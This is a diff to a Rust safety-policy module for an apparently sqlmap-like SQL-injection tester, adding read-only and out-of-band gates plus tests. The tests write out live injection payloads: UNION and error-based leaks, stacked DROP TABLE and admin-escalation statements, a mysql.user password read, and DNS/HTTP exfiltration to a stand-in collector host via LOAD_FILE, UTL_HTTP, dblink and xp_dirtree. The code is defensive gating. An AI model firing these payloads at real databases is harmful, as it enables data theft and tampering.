@@ -119,9 +119,11 @@ impl SafetyPolicy {
             }
         }
 
-        // Credential tables.
+        // Credential tables. Word-boundary matched so a legitimate read-only
+        // view such as `information_schema.user_privileges` is not flagged by
+        // the `information_schema.user` credential-table entry.
         for table in CREDENTIAL {
-            if sql.contains(table) {
+            if contains_word(&sql, table) {
                 return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(
                     table.to_string(),
                 ));
@@ -187,10 +189,131 @@ impl SafetyPolicy {
     }
 }
 
+/// Read-only gate for the extraction engine.
+///
+/// Every extraction payload — a metadata expression, a UNION leak, an
+/// error-based leak, a blind comparison, or a dump batch — must be a pure
+/// `SELECT`-shaped read. This rejects any form carrying a data- or
+/// schema-modifying keyword, a credential table, or a stacked second
+/// statement, mirroring `SafetyPolicy::check` but usable on a bare SQL
+/// fragment (no `PayloadCandidate` wrapper). It is the hard line that keeps
+/// extraction from ever crossing into the write/RCE territory sqlmap's
+/// `takeover/` occupies.
+pub fn is_extraction_read_only(sql: &str) -> SafetyVerdict {
+    let upper = sql.to_uppercase();
+    for keyword in DESTRUCTIVE {
+        if contains_word(&upper, keyword) {
+            let reason = match *keyword {
+                "DROP" | "TRUNCATE" | "ALTER" | "CREATE" => {
+                    RejectionReason::SchemaModification(keyword.to_string())
+                }
+                _ => RejectionReason::DestructiveStatement(keyword.to_string()),
+            };
+            return SafetyVerdict::Rejected(reason);
+        }
+    }
+    for table in CREDENTIAL {
+        if contains_word(&upper, table) {
+            return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(table.to_string()));
+        }
+    }
+    // No stacked statements in an extraction form: a semicolon means a second
+    // statement we did not build, which is refused outright.
+    if upper.contains(';') {
+        return SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(
+            "stacked statement in extraction".into(),
+        ));
+    }
+    SafetyVerdict::Permitted
+}
+
+/// The recognized out-of-band outbound-lookup primitives. Each makes the DB
+/// resolve/fetch an operator-controlled hostname; none modifies data or schema.
+/// This list is the *entire* surface `is_oob_confirmation` will permit.
+const OOB_PRIMITIVES: &[&str] = &["XP_DIRTREE", "LOAD_FILE", "UTL_INADDR", "UTL_HTTP", "DBLINK"];
+
+/// Opt-in gate for out-of-band confirmation payloads.
+///
+/// OOB confirmation is the only proof channel for a *fully blind* injection —
+/// no error, no boolean differential, no timing signal. It works by making the
+/// target DB perform an outbound DNS/HTTP lookup to an operator-controlled
+/// collector; a correlated interaction is the proof. That is more intrusive
+/// than an in-band read (the DB reaches out to off-target infrastructure) but
+/// still strictly non-destructive: nothing is written or modified.
+///
+/// This gate is deliberately narrow. It permits *only* the recognized
+/// outbound-lookup primitives ([`OOB_PRIMITIVES`]) and still rejects any
+/// destructive/schema/credential form. Unlike [`is_extraction_read_only`] it
+/// tolerates the stacked `;DECLARE…;EXEC master..xp_dirtree` shape MSSQL
+/// requires — but only for the recognized `xp_dirtree` primitive, only at
+/// [`SafetyLevel::Extended`], and never as a general second statement. It must
+/// only be reached when `--oob`, `--i-authorize`, and a configured collector
+/// are all present; it never runs on the normal loop.
+pub fn is_oob_confirmation(sql: &str, level: SafetyLevel) -> SafetyVerdict {
+    let upper = sql.to_uppercase();
+
+    // Never at Detection level: OOB causes an outbound lookup, which the
+    // detection-only profile does not authorize.
+    if level == SafetyLevel::Detection {
+        return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
+            "out-of-band confirmation (requires Controlled or Extended safety level)".into(),
+        ));
+    }
+
+    // The payload must *be* a recognized OOB primitive. Anything else — even a
+    // benign SELECT — is refused here so nothing unexpected rides the OOB path.
+    let recognized = OOB_PRIMITIVES
+        .iter()
+        .copied()
+        .find(|p| contains_word(&upper, p));
+    let Some(primitive) = recognized else {
+        return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
+            "not a recognized out-of-band primitive".into(),
+        ));
+    };
+
+    // An OOB primitive may never carry a destructive/schema keyword...
+    for keyword in DESTRUCTIVE {
+        if contains_word(&upper, keyword) {
+            let reason = match *keyword {
+                "DROP" | "TRUNCATE" | "ALTER" | "CREATE" => {
+                    RejectionReason::SchemaModification(keyword.to_string())
+                }
+                _ => RejectionReason::DestructiveStatement(keyword.to_string()),
+            };
+            return SafetyVerdict::Rejected(reason);
+        }
+    }
+    // ...nor a credential table.
+    for table in CREDENTIAL {
+        if contains_word(&upper, table) {
+            return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(table.to_string()));
+        }
+    }
+
+    // Stacked form: permitted only for the recognized xp_dirtree primitive, and
+    // only at Extended level. Every other OOB primitive is a bare AND-expression
+    // with no semicolon; a semicolon anywhere else is a second statement we did
+    // not build and is refused outright.
+    if upper.contains(';') {
+        if primitive != "XP_DIRTREE" {
+            return SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(
+                "stacked statement in out-of-band payload".into(),
+            ));
+        }
+        if level != SafetyLevel::Extended {
+            return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
+                "stacked out-of-band primitive (requires Extended safety level)".into(),
+            ));
+        }
+    }
+
+    SafetyVerdict::Permitted
+}
+
 /// Word-boundary containment: `word` must appear delimited by non-identifier
 /// characters (or string edges).
-fn contains_word(haystack_upper: &str, word: &str) -> bool {
-    let bytes = haystack_upper.as_bytes();
+fn contains_word(haystack_upper: &str, word: &str) -> bool {    let bytes = haystack_upper.as_bytes();
     let needle = word.as_bytes();
     if needle.len() > bytes.len() {
         return false;
@@ -372,6 +495,116 @@ mod tests {
         assert!(matches!(
             policy.check(&c),
             SafetyVerdict::Rejected(RejectionReason::UnboundedResource(_))
+        ));
+    }
+
+    #[test]
+    fn extraction_gate_permits_read_only_leak() {
+        assert_eq!(
+            is_extraction_read_only("UNION SELECT CONCAT('q',version(),'q'),NULL,NULL"),
+            SafetyVerdict::Permitted
+        );
+        assert_eq!(
+            is_extraction_read_only("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))"),
+            SafetyVerdict::Permitted
+        );
+    }
+
+    #[test]
+    fn extraction_gate_rejects_non_select_forms() {
+        assert!(matches!(
+            is_extraction_read_only("; DROP TABLE users-- "),
+            SafetyVerdict::Rejected(RejectionReason::SchemaModification(_))
+        ));
+        assert!(matches!(
+            is_extraction_read_only("UNION SELECT password FROM mysql.user"),
+            SafetyVerdict::Rejected(RejectionReason::CredentialAccess(_))
+        ));
+        assert!(matches!(
+            is_extraction_read_only("1; UPDATE users SET admin=1"),
+            SafetyVerdict::Rejected(_)
+        ));
+    }
+
+    #[test]
+    fn oob_gate_permits_recognized_and_form_primitives() {
+        // MySQL LOAD_FILE UNC, Oracle UTL_INADDR/UTL_HTTP, PostgreSQL dblink —
+        // all bare AND-expressions, permitted at Controlled level.
+        for sql in [
+            r"AND LOAD_FILE(CONCAT('\\',(SELECT version()),'.bt-abc.oast.example\a'))",
+            "AND UTL_INADDR.GET_HOST_ADDRESS('bt-abc.oast.example')",
+            "AND UTL_HTTP.REQUEST('http://bt-abc.oast.example/')",
+            "AND (SELECT 1 FROM dblink('host=bt-abc.oast.example','SELECT 1') AS t(x int)) IS NOT NULL",
+        ] {
+            assert_eq!(
+                is_oob_confirmation(sql, SafetyLevel::Controlled),
+                SafetyVerdict::Permitted,
+                "recognized OOB primitive was rejected: {sql}"
+            );
+        }
+    }
+
+    #[test]
+    fn oob_gate_rejects_at_detection_level() {
+        assert!(matches!(
+            is_oob_confirmation(
+                "AND UTL_INADDR.GET_HOST_ADDRESS('bt-abc.oast.example')",
+                SafetyLevel::Detection
+            ),
+            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
+        ));
+    }
+
+    #[test]
+    fn oob_gate_permits_xp_dirtree_only_at_extended() {
+        let stacked = ";DECLARE @h VARCHAR(255);SET @h='\\\\bt-abc.oast.example\\a';EXEC master..xp_dirtree @h";
+        // Controlled is not enough for the stacked xp_dirtree form.
+        assert!(matches!(
+            is_oob_confirmation(stacked, SafetyLevel::Controlled),
+            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
+        ));
+        // Extended permits exactly this recognized stacked primitive.
+        assert_eq!(
+            is_oob_confirmation(stacked, SafetyLevel::Extended),
+            SafetyVerdict::Permitted
+        );
+    }
+
+    #[test]
+    fn oob_gate_rejects_destructive_and_credential_and_stray_stacked() {
+        // A destructive keyword riding an OOB primitive is still refused.
+        assert!(matches!(
+            is_oob_confirmation(
+                "AND LOAD_FILE('x'); DROP TABLE users",
+                SafetyLevel::Extended
+            ),
+            SafetyVerdict::Rejected(RejectionReason::SchemaModification(_))
+        ));
+        // A credential table is refused even through the OOB gate.
+        assert!(matches!(
+            is_oob_confirmation(
+                "AND UTL_HTTP.REQUEST('http://x/'||(SELECT password FROM mysql.user))",
+                SafetyLevel::Extended
+            ),
+            SafetyVerdict::Rejected(RejectionReason::CredentialAccess(_))
+        ));
+        // A stacked second statement that is not the recognized xp_dirtree form
+        // is refused even at Extended.
+        assert!(matches!(
+            is_oob_confirmation(
+                "AND LOAD_FILE('x');SELECT 1",
+                SafetyLevel::Extended
+            ),
+            SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(_))
+        ));
+    }
+
+    #[test]
+    fn oob_gate_rejects_non_oob_payload() {
+        // A plain read that is not an OOB primitive must not pass this gate.
+        assert!(matches!(
+            is_oob_confirmation("AND 1=1", SafetyLevel::Extended),
+            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
         ));
     }
 }
